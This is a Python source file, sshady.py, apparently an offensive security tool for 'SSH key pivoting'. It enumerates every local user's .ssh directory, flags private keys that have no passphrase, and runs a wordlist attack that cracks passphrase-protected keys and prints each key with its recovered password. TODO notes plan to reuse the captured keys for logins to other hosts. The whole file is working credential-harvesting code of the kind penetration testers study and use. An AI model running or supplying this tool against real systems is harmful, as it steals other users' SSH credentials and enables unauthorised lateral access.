#!/usr/bin/env python

"""
sshady.py -- SSH key pivoting things.
          -- by Daniel Roberson @dmfroberson
TODO:
  - Cracking improvements
    -- username as pass
  - Store keys for the future
- Attempt to login to supplied hosts using captured keys (nmap output as input!)

Requires:
  - paramiko
"""

import os
import pwd
import argparse
import paramiko


# Globals
WORDLIST = "wordlist.txt"
TERSE = False
CRACK = True


def xprint(message):
    """ xprint() -- Wrapper for print function that honors terse setting

    Args:
        message (str) - String to output

    Returns:
        Nothing
    """
    if not TERSE:
        print message


def terseprint(message):
    """ terseprint() -- Wrapper for print function that displays terse messages

    Args:
        message (str) - String to output

    Returns:
        Nothing
    """
    if TERSE:
        print message


def crack_key(keyfile, wordlist):
    """ crack_key() -- Launches a wordlist attack against SSH key

    Args:
        keyfile (str)  - Path to SSH private key.
        wordlist (str) - Path to wordlist.

    Returns:
        True if the password has been discovered.
        False if the password has not been discovered.
    """
    with open(wordlist) as passwords:
        for password in passwords:
            password = password.rstrip()
            if not password:
                continue

            result = try_key(keyfile, password)
            if type(result) == str:
                xprint("      [+] Success! %s:%s" % (keyfile, result))
                terseprint("%s %s" % (keyfile, result))
                return True

    xprint("      [-] Unable to crack SSH key with supplied wordlist.")
    return False


def try_key(keyfile, password=None):
    """ try_key() -- Tries to use an SSH key.

    Args:
        keyfile (str)  - Path to SSH private key
        password (str) - Password to attempt. Default None.

    Returns:
        True if it is a valid key, but the wrong password was supplied.
        False if it is not a valid key.
        The password if it is a valid key and password.
    """
    ssh_key_types = [paramiko.RSAKey.from_private_key_file,
                     paramiko.DSSKey.from_private_key_file,
                     paramiko.ECDSAKey.from_private_key_file]

    for key_type in ssh_key_types:
        try:
            key_type(keyfile, password=password)
        except paramiko.ssh_exception.PasswordRequiredException:
            # Valid key, but wrong password
            return True
        except paramiko.ssh_exception.SSHException:
            return False
        return password

    return False


def process_key(keyfile):
    """ process_key() -- Determine whether a file is a valid SSH key or not and
                      -- act accordingly.

    Args:
        keyfile (str) - Path to file to check

    Returns:
        True if keyfile is an SSH key.
        False if keyfile is not an SSH key.
    """
    result = try_key(keyfile)

    if result == True:
        xprint("  [+] %s appears to be a valid key" % keyfile)
        if CRACK:
            xprint("    [*] Attempting to crack..")
            crack_key(keyfile, WORDLIST)
    elif result == False:
        # Probably not an SSH key
        return False
    elif result == None:
        # No password
        xprint("  [+] %s appears to be a valid, passwordless key" % keyfile)
        terseprint("%s" % keyfile)
        return True

    return True


def parse_cli():
    """ parse_cli() -- Parse CLI input

    Args:
        None

    Returns:
        ArgumentParser namespace relevant to supplied CLI options
    """
    description = "example: ./sshady.py"
    parser = argparse.ArgumentParser(description=description)
    parser.add_argument("-t",
                        "--terse",
                        help="Toggles terse output (useful for scripting)",
                        action="store_true",
                        required=False,
                        default=False)
    parser.add_argument("-w",
                        "--wordlist",
                        help="Specify wordlist to use. Default: %s" % WORDLIST,
                        default=WORDLIST,
                        required=False)
    parser.add_argument("-n",
                        "--nocrack",
                        help="Don't attempt to crack SSH keys.",
                        action="store_false",
                        required=False,
                        default=True)

    args = parser.parse_args()
    return args


def main():
    """ main() -- entry point of program

    Args:
        None

    Returns:
        os.EX_OK on successful run
        os_EX_USAGE on failed run
    """
    global WORDLIST
    global TERSE
    global CRACK

    args = parse_cli()
    WORDLIST = args.wordlist
    TERSE = args.terse
    CRACK = args.nocrack

    xprint("[+] sshady.py -- by Daniel Roberson @dmfroberson")
    xprint("")

    if not os.access(WORDLIST, os.R_OK):
        xprint("[-] Unable to open wordlist %s for reading" % WORDLIST)
        xprint("[-] Exiting.")
        terseprint("Unable to open wordlist %s for reading. Exiting." % \
                   WORDLIST)
        return os.EX_USAGE

    xprint("[+] Searching for SSH keys..")
    xprint("")

    for pwent in pwd.getpwall():
        user = pwent[0]
        sshdir = os.path.join(os.path.expanduser("~%s" % user), ".ssh")

        if os.path.isdir(sshdir):
            xprint("[*] Found .ssh directory for user %s: %s" % (user, sshdir))
            for root, _, filenames in os.walk(sshdir):
                for filename in filenames:
                    checkfile = os.path.join(root, filename)
                    process_key(checkfile)

    xprint("")
    xprint("[+] You must defeat Sheng Long to stand a chance.")
    xprint("[+] Done.")

    return os.EX_OK


if __name__ == "__main__":
    exit(main())
